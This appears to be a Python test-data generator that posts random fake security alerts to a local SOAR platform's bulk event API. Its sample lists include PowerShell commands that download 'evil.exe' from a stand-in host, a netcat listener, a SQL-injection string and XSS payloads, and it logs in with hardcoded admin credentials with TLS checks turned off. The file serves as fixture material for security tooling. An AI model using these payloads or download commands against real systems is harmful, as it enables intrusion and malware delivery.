import json
import random
import datetime
import hashlib
import base64
import requests

host = 'http://localhost'

def auth():
    response = requests.post('{}/api/v2.0/auth/login'.format(host),
                             data=json.dumps({'username':'admin', 'password':'reflex'}),
                             headers={'Content-Type': 'application/json'}, verify=False)
    if response.status_code == 200:
        token = response.json()['access_token']
        return token
    else:
        return None


def bulk(events):

    token = auth()
    if token:
        headers = {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer '+token
        }
        response = requests.post('{}/api/v2.0/event/_bulk'.format(host),
                                 data=json.dumps({"events": events}),
                                 headers=headers, verify=False)
        if response.status_code == 200:
            print(response.json())
        else:
            print(response.json())
    else:
        return events
    
def reference():
    hasher = hashlib.md5()
    hasher.update(str(random.randint(0,1000)+datetime.datetime.utcnow().timestamp()).encode())
    return base64.b64encode(hasher.digest()).decode()


def case_templates():
  
  templates = [
    {"title":"Phishing Analysis","description":"Use this case template when investigating a Phishing e-mail.","tasks":[{"title":"Fetch original e-mail","description":"Get a copy of the original e-mail so that analysis can be performed on it to determine if it really is a phishing e-mail or not.","group_uuid":null,"owner_uuid":null,"order":"0"},{"title":"Notify users","description":"Send a phishing alert e-mail to all users so they are aware they may have been targeted.  This should buy time until the e-mail is scrubbed from the environment.","group_uuid":null,"owner_uuid":null,"order":"1"},{"title":"Quarantine","description":"Remove the original message from the e-mail environment","group_uuid":null,"owner_uuid":null,"order":"2"},{"title":"Post Mortem","description":"What have we learned from this event that could help in future events?","group_uuid":null,"owner_uuid":null,"order":"3"}],"tlp":2,"severity":2,"tags":["phishing"]}
  ]

def random_title_description():
  titles = [
    {'User added to local admins': 'Someone added a normal user to local admins'},
    {'Suspicious DNS hit': 'A machine made a request for a suspicious DNS record'},
    {'Local account discovery': 'A machine exhibited enumeration behavior'},
    {'CVE-2021-40444': 'Remote code execution via malicious document in word'}
  ]

  return titles[random.randint(0, len(titles)-1)]

def random_severity():
  return random.randint(0,3)

def random_host_name():
  names = [
    'thor',
    'sundial',
    'hunter',
    'bigrig',
    'bigbertha',
    'bfg4000',
    'brian-pc'
  ]

  return names[random.randint(0, len(names)-1)]

def random_username():
  users = [
    'brian',
    'joe',
    'jonathan',
    'dave',
    'molly',
    'stevie',
    'justin',
    'josh',
    'adam',
    'matthew',
    'administrator',
    'system'
  ]

  return users[random.randint(0, len(users)-1)]

def random_enumeration_command():
  commands = [
    'whoami /priv',
    'whoami /?',
    'hostname',
    'nc -lvp 5000',
    'nbtstat -rns',
  ]

  return commands[random.randint(0,len(commands)-1)]

def random_powershell_command():
  commands = [
    'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
    'Start-BitsTransfer -Source https://reflexsoar.com/evil.exe -Destination C:/temp/evil.exe -Asynchronous',
    'administrator") OR 1=1 --;',
    'alert(1);',
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    '<IMG SRC="javascript:alert(\'XSS\');">',
    '<IMG SRC=javascript:alert(\'XSS\')>',
    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>'
  ]

  return commands[random.randint(0, len(commands)-1)]

def random_event():
  alert_title = random_title_description()
  alerts = [
    {
      "title": list(alert_title.keys())[0],
      "description": alert_title[list(alert_title.keys())[0]],
      "reference": reference(),
      "tags": [
        "enumeration",
        "T1262"
      ],
      "tlp": 2,
      "severity": random_severity(),
      "observables": [
        {
          "value": random_host_name(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "data_type": "host",
          "tags": [
            "source-host", "windows", "internal"
          ]
        },
        {
          "value": random_username(),
          "ioc": False,
          "tlp": 2,
          "spotted": False,
          "safe": False,
          "data_type": "user",
          "tags": [
            "source-user", "corporate-user"
          ]
        }
      ],
      "raw_log": "something something dark side"
    }
  ]

  return alerts[random.randint(0, len(alerts)-1)]


events = []
for i in range(0,10):
  headers = {
    'Content-Type': 'application/json'
  }
  event = random_event()
  events.append(event)
                                 
  if i % 2 == 0 :
    event['reference'] = reference()
    events.append(event)

print("Sending {} events...".format(len(events)))
bulk(events)